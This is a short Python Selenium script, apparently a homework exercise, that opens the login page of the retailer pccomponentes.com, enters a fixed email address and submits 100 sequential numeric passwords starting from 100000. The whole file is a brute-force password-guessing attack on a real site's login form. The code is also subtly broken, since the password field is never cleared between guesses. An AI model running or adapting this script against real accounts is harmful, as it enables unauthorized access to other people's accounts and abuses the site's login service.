from selenium import webdriver
import time

mail = "tareauno@pebih.com"
contrasena = "100000"

driver = webdriver.Chrome()
driver.get('https://www.pccomponentes.com/login')
time.sleep(30)

box = driver.find_element_by_xpath('//*[@id="username"]')
box.send_keys(mail)
for i in range(100):
    a = int(contrasena)
    a = a + 1
    contrasena = str(a)
    print(contrasena)
    box = driver.find_element_by_xpath('//*[@id="password"]')
    box.send_keys(contrasena)
    box = driver.find_element_by_xpath('//*[@id="login-form"]/button[2]').click()
time.sleep(5)